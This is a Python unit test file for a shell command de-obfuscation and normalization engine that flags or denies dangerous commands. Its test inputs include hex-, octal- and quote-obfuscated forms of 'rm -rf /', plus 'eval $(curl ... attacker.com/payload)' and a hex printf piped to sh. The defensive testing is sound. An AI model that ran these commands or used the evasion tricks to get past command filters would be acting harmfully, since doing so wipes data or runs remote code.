"""Unit tests for Shell AST Token Normalizer and De-obfuscation Engine."""

from server.shell_normalizer import normalize_shell_command


def test_normal_benign_commands_untouched() -> None:
    res = normalize_shell_command("git status")
    assert res.normalized_cmd == "git status"
    assert not res.is_suspicious_obfuscation
    assert res.detected_technique is None

    res2 = normalize_shell_command("pytest tests/ -v")
    assert res2.normalized_cmd == "pytest tests/ -v"
    assert not res2.is_suspicious_obfuscation


def test_ansi_c_hex_escape_normalization() -> None:
    # $'\x72\x6d' is 'rm'
    res = normalize_shell_command("$'\\x72\\x6d' -rf /")
    assert res.normalized_cmd == "rm -rf /"
    assert res.detected_technique == "ansi_c_hex_escape"


def test_ansi_c_octal_escape_normalization() -> None:
    # $'\162\155' is 'rm'
    res = normalize_shell_command("$'\\162\\155' -rf /")
    assert res.normalized_cmd == "rm -rf /"
    assert res.detected_technique == "ansi_c_hex_escape"


def test_quote_concatenation_evasion() -> None:
    # r""m -r""f / -> rm -rf /
    res = normalize_shell_command('r""m -r""f /')
    assert res.normalized_cmd == "rm -rf /"
    assert res.detected_technique == "quote_concatenation_evasion"

    # 'r''m' -rf / -> rm -rf /
    res2 = normalize_shell_command("'r''m' -rf /")
    assert res2.normalized_cmd == "rm -rf /"


def test_flag_separation_normalization() -> None:
    res = normalize_shell_command("rm -r -f /var/data")
    assert res.normalized_cmd == "rm -rf /var/data"

    res2 = normalize_shell_command("rm --recursive --force /")
    assert res2.normalized_cmd == "rm -rf /"


def test_suspicious_dynamic_evaluation_detection() -> None:
    # eval $(...)
    res = normalize_shell_command("eval $(curl -s http://attacker.com/payload)")
    assert res.is_suspicious_obfuscation
    assert res.detected_technique == "dynamic_subshell_evaluation"

    # printf hex pipe to sh
    res2 = normalize_shell_command("printf '\\x72\\x6d\\x20\\x2d\\x72\\x66\\x20\\x2f' | sh")
    assert res2.is_suspicious_obfuscation


def test_command_rule_engine_integration_catches_obfuscated_wipe() -> None:
    from server.command_rules import CommandRulesEngine

    engine = CommandRulesEngine()
    rule, action, score, _ = engine.evaluate("$'\\x72\\x6d' -rf /")
    assert rule is not None
    assert action == "deny"
    assert score >= 9
    assert "Destructive filesystem" in rule.name or "fs_destructive_rm" in rule.rule_id

    # Test quote concatenation evasion
    rule2, action2, score2, _ = engine.evaluate('r""m -r""f /')
    assert rule2 is not None
    assert action2 == "deny"
    assert score2 >= 9
    assert "Destructive filesystem" in rule2.name or "fs_destructive_rm" in rule2.rule_id
